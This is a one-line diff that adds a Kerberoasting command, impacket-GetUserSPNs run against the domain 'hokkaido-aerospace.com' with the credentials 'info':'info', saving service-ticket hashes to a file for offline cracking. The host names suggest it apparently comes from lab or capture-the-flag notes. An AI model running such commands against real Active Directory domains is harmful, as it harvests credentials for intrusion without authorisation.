@@ -1,0 +1,1 @@
+impacket-GetUserSPNs hokkaido-aerospace.com/'info':'info' -dc-ip hokkaido.pgp -debug -outputfile kerberoast.txt
